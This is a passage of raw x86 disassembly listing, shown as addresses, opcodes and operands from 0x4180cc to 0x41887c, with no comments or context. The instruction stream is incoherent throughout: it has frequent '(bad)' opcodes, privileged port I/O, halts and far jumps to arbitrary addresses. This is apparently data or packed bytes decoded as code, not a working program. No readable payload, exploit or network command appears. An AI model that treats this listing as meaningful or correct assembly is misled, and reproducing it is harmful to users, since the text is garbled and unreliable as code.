  4180cc:	dec    eax
  4180cd:	(bad)  
  4180ce:	and    esi,DWORD PTR [eax+eiz*8-0x69]
  4180d2:	repnz mov ebx,0x67b3db5c
  4180d8:	sbb    ch,BYTE PTR [edi+0x51]
  4180db:	jbe    0x41809a
  4180dd:	repz cwde 
  4180df:	out    dx,al
  4180e0:	sub    BYTE PTR [ebx],dl
  4180e2:	mov    al,ds:0x428c1cbe
  4180e7:	lahf   
  4180e8:	adc    al,0x8c
  4180ea:	dec    esi
  4180eb:	push   ecx
  4180ec:	add    al,0x53
  4180ee:	mov    dl,0xdb
  4180f0:	jbe    0x41814d
  4180f2:	xor    BYTE PTR [edx],ch
  4180f4:	into   
  4180f5:	cld    
  4180f6:	xor    al,BYTE PTR gs:0x3767f80a
  4180fd:	and    esi,DWORD PTR [esi]
  4180ff:	popf   
  418100:	ret    0x4dd7
  418103:	inc    edi
  418104:	inc    ebp
  418105:	pop    edx
  418106:	cs adc al,0x98
  418109:	in     eax,0x2b
  41810b:	cmp    al,0x1
  41810d:	jmp    0x4180f4
  41810f:	in     eax,0x63
  418111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418112:	popf   
  418113:	fnsave [edi]
  418115:	mov    eax,ds:0x84667b54
  41811a:	sti    
  41811b:	sub    bl,cl
  41811d:	pop    ss
  41811e:	popf   
  41811f:	cmp    al,0xd8
  418121:	and    eax,0x48696375
  418126:	xchg   al,ch
  418128:	sub    al,0x95
  41812a:	sahf   
  41812b:	pop    eax
  41812c:	adc    eax,0x3d3af2fe
  418131:	and    BYTE PTR ds:0x26e1ffd3,ah
  418137:	sbb    eax,DWORD PTR [esi+0x2ba0d080]
  41813d:	and    DWORD PTR [esi],esi
  41813f:	inc    ebx
  418140:	(bad)  
  418141:	scas   eax,DWORD PTR es:[edi]
  418142:	fidivr WORD PTR [ebx-0x33]
  418145:	push   ds
  418146:	or     BYTE PTR [ebx+0x8],ch
  418149:	call   0x9b7f0aff
  41814e:	stos   DWORD PTR es:[edi],eax
  41814f:	mov    edi,0x6a4ea09c
  418154:	aas    
  418155:	push   ss
  418156:	sbb    ch,dl
  418158:	stos   BYTE PTR es:[edi],al
  418159:	daa    
  41815a:	sub    bl,BYTE PTR [ebp+0x1]
  41815d:	mov    bl,0x12
  41815f:	sbb    BYTE PTR [eax-0x39165db],cl
  418165:	lds    eax,FWORD PTR [edx-0x3a]
  418168:	dec    ecx
  418169:	and    ecx,DWORD PTR [eax]
  41816b:	test   al,0x62
  41816d:	jae    0x41811f
  41816f:	shl    DWORD PTR [ebx-0x7a],0xa3
  418173:	pop    ss
  418174:	ss mov esi,0xcba037c
  41817a:	in     al,dx
  41817b:	imul   edi,DWORD PTR [edi],0xffffff9f
  41817e:	ja     0x41816d
  418180:	ins    DWORD PTR es:[edi],dx
  418181:	dec    ebp
  418182:	test   al,0x7
  418184:	add    al,BYTE PTR [eax]
  418186:	dec    ebx
  418187:	mov    dl,0x2
  418189:	inc    edx
  41818a:	jbe    0x4181c0
  41818c:	adc    edx,DWORD PTR [esi+0x2fa2900f]
  418192:	int3   
  418193:	and    ebp,0xffffffaf
  418196:	data16 adc cl,BYTE PTR [edi+0x5d]
  41819a:	mov    dh,0x94
  41819c:	imul   esi,DWORD PTR [esi-0x660caec4],0xffffffbe
  4181a3:	pop    ecx
  4181a4:	gs xor esp,ebx
  4181a7:	xor    BYTE PTR ss:[eax],ch
  4181aa:	ret    0x7d81
  4181ad:	js     0x4181f0
  4181af:	pop    ss
  4181b0:	or     edx,ecx
  4181b2:	loope  0x4181f2
  4181b4:	dec    ebx
  4181b5:	ins    DWORD PTR es:[edi],dx
  4181b6:	mov    eax,0x20a59695
  4181bb:	mov    eax,ds:0xf166c256
  4181c0:	jae    0x418205
  4181c2:	arpl   WORD PTR [esi],di
  4181c4:	jle    0x4181a5
  4181c6:	shr    BYTE PTR [edx],0xbf
  4181c9:	cli    
  4181ca:	xchg   ecx,eax
  4181cb:	aas    
  4181cc:	mov    ebp,edi
  4181ce:	mov    eax,ds:0x5072c571
  4181d3:	ins    DWORD PTR es:[edi],dx
  4181d4:	xchg   ecx,eax
  4181d5:	sahf   
  4181d6:	pop    edx
  4181d7:	mov    DWORD PTR [eax-0x412c15fa],eax
  4181dd:	pop    esi
  4181de:	inc    eax
  4181df:	loope  0x41824d
  4181e1:	shr    esi,1
  4181e3:	cmp    esi,eax
  4181e5:	and    BYTE PTR [eax+0x3c],bl
  4181e8:	pop    ebp
  4181e9:	inc    edx
  4181ea:	mov    esi,DWORD PTR [ecx+0x56528f7b]
  4181f0:	xor    ch,al
  4181f2:	cs ds jae 0x418233
  4181f6:	xor    BYTE PTR [edi-0x3550092b],ch
  4181fc:	cwde   
  4181fd:	mov    eax,0x7b6cbf41
  418202:	xor    eax,0x73016e0f
  418207:	xchg   esp,eax
  418208:	jns    0x56cb257a
  41820e:	xor    bh,0x95
  418211:	pop    ss
  418212:	jb     0x418256
  418214:	lods   al,BYTE PTR ds:[esi]
  418215:	psrlw  mm4,QWORD PTR [esi]
  418218:	push   cs
  418219:	shr    DWORD PTR [ecx+0x3],cl
  41821c:	dec    esp
  41821d:	and    bh,dh
  41821f:	mov    ?,ecx
  418221:	inc    ebx
  418222:	in     al,0x74
  418224:	mov    bh,0xd5
  418226:	lds    esp,FWORD PTR [edx-0x6]
  418229:	data16 je 0x4181af
  41822c:	adc    bl,BYTE PTR [ebp+0x40]
  41822f:	sbb    ebp,edi
  418231:	jge    0x418244
  418233:	xchg   ecx,eax
  418234:	ret    
  418235:	std    
  418236:	and    bh,BYTE PTR [edi]
  418238:	mov    esi,0x3be36f90
  41823d:	pop    edi
  41823e:	data16 clc 
  418240:	call   0xbc82e348
  418245:	into   
  418246:	add    DWORD PTR [edx-0x79],ebp
  418249:	sub    eax,0x5fdf9727
  41824e:	jmp    0x41820a
  418250:	shl    DWORD PTR [eax+0x1b9b8041],0x32
  418257:	adc    edx,eax
  418259:	loopne 0x418205
  41825b:	or     al,0x81
  41825d:	add    DWORD PTR [edi+ecx*4-0x2d],ecx
  418261:	inc    ebx
  418262:	scas   eax,DWORD PTR es:[edi]
  418263:	xchg   edi,eax
  418264:	into   
  418265:	retf   
  418266:	xor    edi,eax
  418268:	dec    ebp
  418269:	xchg   edx,eax
  41826a:	cmp    DWORD PTR [ecx-0x74],ecx
  41826d:	push   ecx
  41826e:	push   esp
  41826f:	sbb    edi,esi
  418271:	je     0x4182be
  418273:	dec    ebx
  418274:	mov    ch,0xfe
  418276:	loopne 0x4182eb
  418278:	pop    edx
  418279:	xor    eax,0x8e918240
  41827e:	ins    BYTE PTR es:[edi],dx
  41827f:	adc    BYTE PTR [ebx],ch
  418281:	and    eax,0x2da463d8
  418286:	push   eax
  418287:	push   ebp
  418288:	fimul  WORD PTR [esi]
  41828a:	mov    esp,0xcc5b7337
  41828f:	mov    ecx,0x2b6832d3
  418294:	jno    0x418304
  418296:	sub    al,0xc0
  418298:	or     ecx,DWORD PTR [esi+0xa]
  41829b:	mov    tr6,ebp
  41829e:	mov    eax,ds:0x11ffb854
  4182a3:	pop    ecx
  4182a4:	mov    DWORD PTR [esi+0x60],edx
  4182a7:	mov    DWORD PTR [esi-0x1d],esp
  4182aa:	into   
  4182ab:	rol    BYTE PTR [esi-0x29863c36],cl
  4182b1:	pop    ss
  4182b2:	adc    al,0xef
  4182b4:	jmp    0x5852f3e
  4182b9:	cmp    eax,0x6f708cb1
  4182be:	sub    dl,BYTE PTR [ebx+0x633ff59d]
  4182c4:	fadd   st(0),st
  4182c6:	jnp    0x418336
  4182c8:	ret    
  4182c9:	push   eax
  4182ca:	(bad)  
  4182cb:	fidiv  DWORD PTR [ecx+0xfb6b486]
  4182d1:	sbb    ah,ah
  4182d3:	sbb    al,0x97
  4182d5:	jge    0x4182f0
  4182d7:	pop    ebp
  4182d8:	or     DWORD PTR [edx+0x7a5f1b35],eax
  4182de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182df:	xchg   ecx,eax
  4182e0:	xchg   ebp,eax
  4182e1:	aaa    
  4182e2:	pop    edx
  4182e3:	or     eax,0x6d967827
  4182e8:	adc    al,BYTE PTR [ebp-0x77ac85f8]
  4182ee:	or     dl,BYTE PTR [esi]
  4182f0:	pop    ebx
  4182f1:	jbe    0x4182ee
  4182f3:	jl     0x4182e5
  4182f5:	sub    DWORD PTR ds:0x9c9db08a,ecx
  4182fb:	push   ebx
  4182fc:	nop
  4182fd:	enter  0xbfa3,0x9
  418301:	std    
  418302:	xchg   ebx,eax
  418303:	pop    esp
  418304:	mov    cl,0x32
  418306:	leave  
  418307:	mov    edi,0x6f8a845b
  41830c:	pop    esi
  41830d:	push   esi
  41830e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830f:	daa    
  418310:	dec    eax
  418311:	lahf   
  418312:	and    eax,0x29a68efb
  418317:	push   ebx
  418318:	add    ebx,DWORD PTR [ebx]
  41831a:	and    eax,0x2c935b13
  41831f:	repnz repnz mov ebp,0x81d1bac8
  418326:	shl    ebx,cl
  418328:	xlat   BYTE PTR ds:[ebx]
  418329:	sbb    al,0x3b
  41832b:	lds    edx,FWORD PTR [ebx+0x1f]
  41832e:	shl    DWORD PTR [ebx],1
  418330:	cmp    dh,BYTE PTR [esi+0x52809e37]
  418336:	jae    0x418376
  418338:	ins    BYTE PTR es:[edi],dx
  418339:	arpl   bx,si
  41833b:	fs add al,0xb0
  41833e:	xor    al,0xe2
  418340:	call   0xae8e:0x68dd41f7
  418347:	popf   
  418348:	(bad)  
  418349:	out    0x76,al
  41834b:	sbb    DWORD PTR [eax],ebx
  41834d:	cmp    eax,0xe1df7754
  418352:	gs cdq 
  418354:	js     0x418352
  418356:	sbb    esp,ebp
  418358:	adc    DWORD PTR [ebp-0x77],edi
  41835b:	popf   
  41835c:	jne    0x418373
  41835e:	inc    esp
  41835f:	stc    
  418360:	rcr    BYTE PTR [edi+ebx*1-0x6ff28f8e],0x9b
  418368:	adc    dh,BYTE PTR ds:0x66a24425
  41836e:	(bad)  
  41836f:	fdiv   QWORD PTR [edi-0x48520079]
  418375:	fmul   DWORD PTR [edx-0x44]
  418378:	and    al,0xda
  41837a:	push   esi
  41837b:	and    eax,0x3cfa9fe2
  418380:	mov    gs,esi
  418382:	inc    edx
  418383:	pop    edi
  418384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418385:	mov    dl,0x8
  418387:	ds push 0x56
  41838a:	sbb    dl,BYTE PTR [edx+0x762a1871]
  418390:	mov    ds:0xa133bca5,eax
  418395:	jmp    0x344b:0x305de012
  41839c:	add    al,dl
  41839e:	out    0x6e,eax
  4183a0:	lahf   
  4183a1:	js     0x4183ba
  4183a3:	outs   dx,DWORD PTR ds:[esi]
  4183a4:	xchg   ecx,eax
  4183a5:	jbe    0x41838d
  4183a7:	add    eax,0xc5901553
  4183ac:	(bad)  
  4183ad:	sbb    ch,BYTE PTR [ebp-0x4d4d886f]
  4183b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183b4:	hlt    
  4183b5:	sub    ah,cl
  4183b7:	push   0x74
  4183b9:	pop    ebp
  4183ba:	aam    0xa7
  4183bc:	or     ebx,edi
  4183be:	test   BYTE PTR [edx-0x26ae5206],ch
  4183c4:	rcl    BYTE PTR [esi],cl
  4183c6:	lods   al,BYTE PTR ds:[esi]
  4183c7:	adc    BYTE PTR [ecx+0x20],al
  4183ca:	inc    edi
  4183cb:	sbb    al,0x5
  4183cd:	(bad)  
  4183ce:	push   edx
  4183cf:	add    ch,BYTE PTR [edx]
  4183d1:	push   esi
  4183d2:	test   eax,0x25457047
  4183d7:	mov    bl,0x8
  4183d9:	push   0x245aa1c0
  4183de:	push   es
  4183df:	dec    esp
  4183e0:	xchg   ebx,eax
  4183e1:	loopne 0x4183c1
  4183e3:	pop    edx
  4183e4:	jnp    0x418456
  4183e6:	sub    DWORD PTR [edx-0x380d8a4a],ecx
  4183ec:	in     eax,dx
  4183ed:	call   0x23fed38c
  4183f2:	retf   0xe1f4
  4183f5:	jno    0x4183eb
  4183f7:	push   eax
  4183f8:	jmp    0x3defaffb
  4183fd:	ffreep st(4)
  4183ff:	dec    esi
  418400:	popa   
  418401:	sbb    edx,DWORD PTR [edi]
  418403:	sbb    ebx,DWORD PTR [ecx]
  418405:	in     eax,dx
  418406:	push   cs
  418407:	xchg   ebx,eax
  418408:	pusha  
  418409:	pop    ebp
  41840a:	rcl    ah,1
  41840c:	mov    ch,0x28
  41840e:	push   cs
  41840f:	push   0xf3001f90
  418414:	nop
  418415:	mov    WORD PTR [esi-0x316de4f2],?
  41841b:	std    
  41841c:	or     eax,0x16e8dab3
  418421:	cs mov eax,0xf7682a88
  418427:	(bad)  
  418428:	sti    
  418429:	pusha  
  41842a:	and    BYTE PTR ds:0xee3eedb,ah
  418430:	jg     0x418463
  418432:	outs   dx,BYTE PTR ds:[esi]
  418433:	lahf   
  418434:	stc    
  418435:	jmp    0x7051ce07
  41843a:	stos   DWORD PTR es:[edi],eax
  41843b:	push   ebp
  41843c:	mov    esi,ecx
  41843e:	in     eax,dx
  41843f:	in     eax,dx
  418440:	mov    ds:0xb371b3a5,eax
  418445:	sbb    DWORD PTR [edi+0x51],ecx
  418448:	dec    edx
  418449:	jmp    0x5ea270c6
  41844e:	lea    edi,[edi+0x4f6ea7fd]
  418454:	push   0x1e4724cd
  418459:	sbb    ebp,esi
  41845b:	loope  0x4184c7
  41845d:	xchg   BYTE PTR [edx+0x2c],bl
  418460:	out    dx,eax
  418461:	pop    esi
  418462:	xor    al,0x17
  418464:	scas   al,BYTE PTR es:[edi]
  418465:	shr    DWORD PTR [edx+edx*1+0x7a],cl
  418469:	outs   dx,BYTE PTR ds:[esi]
  41846a:	nop
  41846b:	sbb    DWORD PTR [eax+0x4f],0x6d0c1d6e
  418472:	shr    BYTE PTR [eax+0x5dbe9b74],1
  418478:	xchg   edx,eax
  418479:	lahf   
  41847a:	jns    0x41844c
  41847c:	inc    esi
  41847d:	fs hlt 
  41847f:	mov    cl,0xe3
  418481:	not    ch
  418483:	mov    esi,0xdda54c46
  418488:	hlt    
  418489:	jae    0x418434
  41848b:	pop    edx
  41848c:	jmp    0xbebdff9
  418491:	xlat   BYTE PTR ds:[ebx]
  418492:	cwde   
  418493:	enter  0xdb44,0xb3
  418497:	jge    0x4184bf
  418499:	jo     0x4184f8
  41849b:	pop    edi
  41849c:	jecxz  0x418445
  41849e:	mov    al,ds:0xad66fdd9
  4184a3:	outs   dx,DWORD PTR ds:[esi]
  4184a4:	lods   eax,DWORD PTR ds:[esi]
  4184a5:	or     dh,BYTE PTR [ebp-0x70]
  4184a8:	ds xor edx,ebp
  4184ab:	retf   
  4184ac:	dec    ebp
  4184ad:	jmp    0x58f4:0xd6340821
  4184b4:	push   cs
  4184b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b6:	mov    DWORD PTR [ebx+eiz*4],edx
  4184b9:	popa   
  4184ba:	lea    bx,[ecx+0x5e]
  4184be:	sbb    DWORD PTR [esi-0x7099125a],esi
  4184c4:	loope  0x418474
  4184c6:	shl    DWORD PTR ds:0xcf5fba84,1
  4184cc:	pop    edx
  4184cd:	je     0x4184df
  4184cf:	push   edi
  4184d0:	cmp    BYTE PTR [ecx+0x62],bh
  4184d3:	mov    ch,0x67
  4184d5:	jge    0x418469
  4184d7:	adc    edi,DWORD PTR [ecx-0x4d5cd943]
  4184dd:	das    
  4184de:	ja     0x418492
  4184e0:	jmp    0x2a930318
  4184e5:	imul   edi,DWORD PTR [eax+ebp*8],0xbdd37a7d
  4184ec:	push   ecx
  4184ed:	int3   
  4184ee:	nop
  4184ef:	loopne 0x41856d
  4184f1:	cs push 0x807e09ee
  4184f7:	int3   
  4184f8:	in     eax,0x68
  4184fa:	out    0xa9,eax
  4184fc:	jae    0x41854b
  4184fe:	push   esp
  4184ff:	push   ss
  418500:	jg     0x4184f2
  418502:	enter  0x15f8,0xeb
  418506:	lods   al,BYTE PTR ds:[esi]
  418507:	cmp    DWORD PTR [ebx-0x65],ebp
  41850a:	es adc eax,0xca10cbe5
  418510:	push   es
  418511:	stc    
  418512:	call   0xebd9:0xed047d46
  418519:	inc    ebp
  41851a:	dec    esp
  41851b:	or     BYTE PTR [ecx-0x38],bl
  41851e:	(bad)  
  41851f:	arpl   WORD PTR [eax+0x3c],sp
  418522:	in     eax,0x5b
  418524:	sbb    eax,0x899f45d3
  418529:	call   0xfb00:0xbfd0b532
  418530:	sbb    BYTE PTR [ebx],0x39
  418533:	xchg   esp,eax
  418534:	ds call 0x4dd9:0xfd877c4
  41853c:	int3   
  41853d:	loope  0x418582
  41853f:	xlat   BYTE PTR ds:[ebx]
  418540:	ret    
  418541:	iret   
  418542:	or     eax,0x56bf15a2
  418547:	and    esi,DWORD PTR [edi]
  418549:	inc    eax
  41854a:	sbb    bl,BYTE PTR [esi]
  41854c:	or     ebx,0xbb6126d1
  418552:	xchg   ebp,eax
  418553:	scas   eax,DWORD PTR es:[edi]
  418554:	and    DWORD PTR [eax],edx
  418556:	adc    bh,bh
  418558:	in     eax,dx
  418559:	loope  0x418571
  41855b:	sub    edx,DWORD PTR [esi+0x7b]
  41855e:	adc    cl,BYTE PTR [edi]
  418560:	popf   
  418561:	sbb    al,bl
  418563:	pop    esi
  418564:	ss push ds
  418566:	hlt    
  418567:	jp     0x4185e1
  418569:	xchg   esi,eax
  41856a:	pop    ecx
  41856b:	mov    di,0x535c
  41856f:	sub    al,0xa0
  418571:	retf   
  418572:	push   ebx
  418573:	add    BYTE PTR [edi-0x1c],bh
  418576:	lea    eax,[ebx-0x72]
  418579:	loopne 0x4184fc
  41857b:	inc    ebp
  41857c:	adc    DWORD PTR [edx+ebp*1+0x40],ebp
  418580:	leave  
  418581:	xor    ah,BYTE PTR [ebp+eiz*4-0x692b5f23]
  418588:	into   
  418589:	mov    al,ds:0xf3caa5dc
  41858e:	repnz out 0xc9,eax
  418591:	test   al,0x69
  418593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418594:	add    DWORD PTR [ebx+0x25647b36],eax
  41859a:	push   0x52
  41859c:	jg     0x418612
  41859e:	push   0x418e7e32
  4185a3:	mov    ecx,0x18c14aaf
  4185a8:	(bad)  
  4185a9:	enter  0x5281,0x8f
  4185ad:	cwde   
  4185ae:	jmp    0xdc07:0xa5fca7eb
  4185b5:	dec    esi
  4185b6:	loopne 0x418580
  4185b8:	sbb    BYTE PTR [ecx+0x774a66bd],cl
  4185be:	sub    al,ah
  4185c0:	inc    edi
  4185c1:	sub    ebx,edx
  4185c3:	cs push edx
  4185c5:	mov    edi,0xdbdc04fe
  4185ca:	rcr    BYTE PTR [esi-0x1d292fba],0xb1
  4185d1:	mov    cs,WORD PTR [edx+0x92a6638]
  4185d7:	xor    edx,DWORD PTR [ecx+0x76463c8f]
  4185dd:	jmp    0x418615
  4185df:	loopne 0x418601
  4185e1:	ror    ebp,cl
  4185e3:	mov    edi,0x52123283
  4185e8:	dec    esi
  4185e9:	pop    edi
  4185ea:	push   ss
  4185eb:	add    eax,DWORD PTR [ecx+ecx*8]
  4185ee:	xchg   ecx,eax
  4185ef:	test   eax,0xbaeef04d
  4185f4:	int    0x11
  4185f6:	adc    ch,BYTE PTR [ebx-0x7b]
  4185f9:	xor    eax,0x45a22050
  4185fe:	jg     0x4185f2
  418600:	jp     0x41866b
  418602:	sub    DWORD PTR [edi-0x6d4d6a35],eax
  418608:	pop    esp
  418609:	and    BYTE PTR [edx+0x23],ah
  41860c:	mov    ds:0x8da2765e,al
  418611:	sbb    ah,cl
  418613:	lods   eax,DWORD PTR ds:[esi]
  418614:	adc    dh,al
  418616:	push   es
  418617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418618:	sbb    al,0x43
  41861a:	cmp    bl,0xcb
  41861d:	mul    BYTE PTR [ebx+ebx*1-0x65]
  418621:	push   esp
  418622:	push   eax
  418623:	popf   
  418624:	cmp    edx,DWORD PTR [ecx+0x44]
  418627:	js     0x41864f
  418629:	pop    ss
  41862a:	add    al,0x88
  41862c:	push   esi
  41862d:	(bad)  
  41862f:	mov    BYTE PTR [eax+0x1586cab5],ah
  418635:	idiv   DWORD PTR [ecx+0x16]
  418638:	adc    bh,BYTE PTR [ebp-0x13]
  41863b:	lods   eax,DWORD PTR ds:[esi]
  41863c:	dec    edi
  41863d:	xor    al,dh
  41863f:	push   ecx
  418640:	push   ds
  418641:	pop    ebp
  418642:	sahf   
  418643:	push   ds
  418644:	xor    ebp,edi
  418646:	or     BYTE PTR [ebx-0x37bb7d0c],bl
  41864c:	mov    eax,ds:0xb049cc92
  418651:	mov    WORD PTR [ebx+0x51],gs
  418654:	mov    ecx,DWORD PTR [edi]
  418656:	in     al,dx
  418657:	test   al,0xdd
  418659:	mov    ds:0x587ebdb,al
  41865e:	pop    esi
  41865f:	push   esp
  418660:	lea    eax,[eax]
  418662:	inc    edx
  418663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418664:	adc    eax,0x45d3f12
  418669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41866a:	sub    al,ch
  41866c:	mov    ds:0xe08f39fe,al
  418671:	inc    esp
  418672:	sti    
  418673:	cwde   
  418674:	les    esi,FWORD PTR [edx+edx*8-0x2610cf95]
  41867b:	mov    eax,0x7a38de2
  418680:	mov    dh,0xed
  418682:	and    esi,DWORD PTR [ecx+eax*8-0x7]
  418686:	add    edx,DWORD PTR [edx+0x235da693]
  41868c:	scas   eax,DWORD PTR es:[edi]
  41868d:	inc    esi
  41868e:	jne    0x4186c2
  418690:	imul   eax,DWORD PTR [ebx+edx*2+0x1c85f15],0x43057505
  41869b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41869c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41869d:	sbb    cl,BYTE PTR [eax+eiz*4+0xde304e9]
  4186a4:	xchg   edi,eax
  4186a5:	mov    edx,DWORD PTR [ebx]
  4186a7:	js     0x418693
  4186a9:	mov    WORD PTR [ebx+0x1f],cs
  4186ac:	nop
  4186ad:	pop    edx
  4186ae:	adc    dh,ch
  4186b0:	xor    ch,dh
  4186b2:	sub    bl,dl
  4186b4:	(bad)  
  4186b5:	mov    cs,WORD PTR [esp+esi*2-0x44]
  4186b9:	inc    edx
  4186ba:	pop    esi
  4186bb:	lahf   
  4186bc:	jbe    0x41864c
  4186be:	cwde   
  4186bf:	outs   dx,BYTE PTR ds:[esi]
  4186c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c1:	jg     0x4186e9
  4186c3:	jmp    FWORD PTR [ecx+0x26]
  4186c6:	das    
  4186c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c8:	and    ecx,edi
  4186ca:	mov    al,0x94
  4186cc:	xchg   ecx,eax
  4186cd:	cmp    BYTE PTR [edi],bl
  4186cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186d0:	outs   dx,DWORD PTR ds:[esi]
  4186d1:	mov    bl,0x54
  4186d3:	(bad)  
  4186d4:	sub    eax,DWORD PTR [esi-0x3649f97c]
  4186da:	dec    ebp
  4186dc:	test   BYTE PTR [esp+ebp*2+0x43],cl
  4186e0:	mov    ecx,0x95446afe
  4186e5:	hlt    
  4186e6:	cmp    BYTE PTR [ebp-0x44],0x73
  4186ea:	cmc    
  4186eb:	jno    0x41871a
  4186ed:	jb     0x418716
  4186ef:	mov    ebx,gs
  4186f1:	popa   
  4186f2:	or     esp,esi
  4186f4:	jae    0x41876c
  4186f6:	adc    ah,bh
  4186f8:	retf   
  4186f9:	enter  0x5c24,0x26
  4186fd:	mov    dh,0x80
  4186ff:	adc    ch,0x52
  418702:	mov    dl,0x90
  418704:	mov    ah,0x90
  418706:	mov    ah,al
  418708:	mov    edx,0xeaca631f
  41870d:	add    DWORD PTR [edx+0x16],eax
  418710:	xchg   ah,bl
  418712:	lods   eax,DWORD PTR ds:[esi]
  418713:	inc    esp
  418714:	(bad)  
  418715:	mov    cl,0x2b
  418717:	xor    eax,0x599895d1
  41871c:	jmp    0x4186f5
  41871e:	(bad)  
  41871f:	jl     0x41871c
  418721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418722:	jg     0x418701
  418724:	mov    eax,ds:0xffd8c565
  418729:	and    al,0x40
  41872b:	push   esp
  41872c:	push   0x7f
  41872e:	mov    cl,0xa3
  418730:	mov    bl,al
  418732:	nop
  418733:	scas   eax,DWORD PTR es:[edi]
  418734:	jb     0x41876a
  418736:	cdq    
  418737:	add    bh,dl
  418739:	push   es
  41873a:	pop    esi
  41873b:	or     al,0x10
  41873d:	in     eax,dx
  41873e:	pop    edx
  41873f:	je     0x418730
  418741:	or     BYTE PTR [eax],dl
  418743:	sti    
  418744:	or     ah,0x26
  418747:	dec    esp
  418748:	into   
  418749:	add    cl,0xd6
  41874c:	retf   0xf48e
  41874f:	mov    dh,0xd9
  418751:	js     0x41875e
  418753:	sti    
  418754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418756:	adc    dh,BYTE PTR [edi]
  418758:	mov    dh,0x86
  41875a:	stos   BYTE PTR es:[edi],al
  41875b:	jbe    0x4187a2
  41875d:	imul   edi,DWORD PTR [ebx+0x62],0xef419951
  418764:	mov    eax,ds:0xd86debc4
  418769:	xchg   DWORD PTR [edi+eiz*8],edi
  41876c:	ins    BYTE PTR es:[edi],dx
  41876d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41876e:	fidiv  WORD PTR ss:[ecx]
  418771:	test   DWORD PTR [esi+ebp*4+0x29],edi
  418775:	or     ebx,eax
  418777:	stc    
  418778:	test   BYTE PTR [ebx+edx*8],al
  41877b:	fcmovu st,st(2)
  41877d:	xor    DWORD PTR [edi],ecx
  41877f:	add    eax,ebx
  418781:	test   BYTE PTR [esi],ah
  418783:	fwait
  418784:	sbb    ch,ah
  418786:	or     eax,0x2b29935c
  41878b:	sub    BYTE PTR [ebp-0x55],ah
  41878e:	enter  0x6c4b,0x61
  418792:	repz mov WORD PTR [esi-0x731a8547],?
  418799:	pusha  
  41879a:	jle    0x418770
  41879c:	jle    0x4187d3
  41879e:	pop    ebp
  41879f:	add    al,0xde
  4187a1:	and    eax,0x2e8afcbe
  4187a6:	leave  
  4187a7:	and    ch,BYTE PTR [esi-0xa2d0642]
  4187ad:	(bad)  
  4187af:	lea    eax,[eax+eax*8+0x6d82b786]
  4187b6:	pop    ds
  4187b7:	jb     0x418752
  4187b9:	dec    edi
  4187ba:	jp     0x418740
  4187bc:	mov    ds:0x5299e2d4,al
  4187c1:	cli    
  4187c2:	in     eax,0x15
  4187c4:	xor    dl,BYTE PTR [eax+ebx*8+0x7d7e1711]
  4187cb:	push   0x20
  4187cd:	jge    0x41883e
  4187cf:	mov    al,ds:0xa42815fd
  4187d4:	sub    al,0x4c
  4187d6:	clc    
  4187d7:	sbb    bl,BYTE PTR [ecx]
  4187d9:	xchg   esi,eax
  4187da:	pop    esp
  4187db:	out    0xcf,al
  4187dd:	inc    edi
  4187de:	repz (bad)
  4187e1:	pop    ebx
  4187e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e3:	sbb    bh,bl
  4187e5:	dec    eax
  4187e6:	jmp    0xc3cf:0xb09c0e02
  4187ed:	icebp  
  4187ee:	fld    TBYTE PTR [ebp-0x7c]
  4187f1:	stos   DWORD PTR es:[edi],eax
  4187f2:	cmovns edx,ebx
  4187f5:	leave  
  4187f6:	xchg   ecx,eax
  4187f7:	or     bl,bh
  4187f9:	out    0xfc,al
  4187fb:	jne    0x4187c5
  4187fd:	cmc    
  4187fe:	cs dec ecx
  418800:	fidivr WORD PTR ds:0xec4fb4b2
  418806:	cwde   
  418807:	and    BYTE PTR es:[ecx+0x36],dl
  41880b:	ret    
  41880c:	dec    esi
  41880d:	dec    edx
  41880e:	or     al,dl
  418810:	fwait
  418811:	jnp    0x41887f
  418813:	cmp    DWORD PTR [eax+0x2f91ee40],0xf4e3bfe0
  41881d:	fidiv  WORD PTR [edx-0x10]
  418820:	cmc    
  418821:	fnstsw WORD PTR cs:[edx]
  418824:	inc    esp
  418825:	mov    cl,0x48
  418827:	xor    ebx,DWORD PTR [eax+edx*1-0x1cc9019b]
  41882e:	or     bh,BYTE PTR [ecx]
  418830:	arpl   WORD PTR [edx+0x1bb556db],di
  418836:	mov    esp,0x920db6fa
  41883b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41883c:	adc    BYTE PTR [ebp-0x7c],ah
  41883f:	push   eax
  418840:	jp     0x418839
  418842:	int3   
  418843:	pop    ebp
  418844:	and    eax,0xd5ac9664
  418849:	jmp    0x418837
  41884b:	mov    bl,0x5f
  41884d:	sbb    BYTE PTR [eax],dh
  41884f:	cdq    
  418850:	sub    ebp,eax
  418852:	ss hlt 
  418854:	add    al,0x9
  418856:	hlt    
  418857:	xor    eax,0x8bb044d1
  41885c:	jmp    0x345f572c
  418861:	jle    0x418850
  418863:	(bad)  [ebx]
  418865:	cwde   
  418866:	pop    ds
  418867:	xchg   edx,eax
  418868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418869:	idiv   ecx
  41886b:	out    dx,eax
  41886c:	shl    DWORD PTR [edi-0x38],0x9
  418870:	or     esi,esi
  418872:	cmp    DWORD PTR [edi],esi
  418874:	push   edx
  418875:	shl    DWORD PTR [esi+0x14],cl
  418878:	arpl   WORD PTR [ebx+edx*8+0x37],dx
  41887c:	in     eax,0x3a
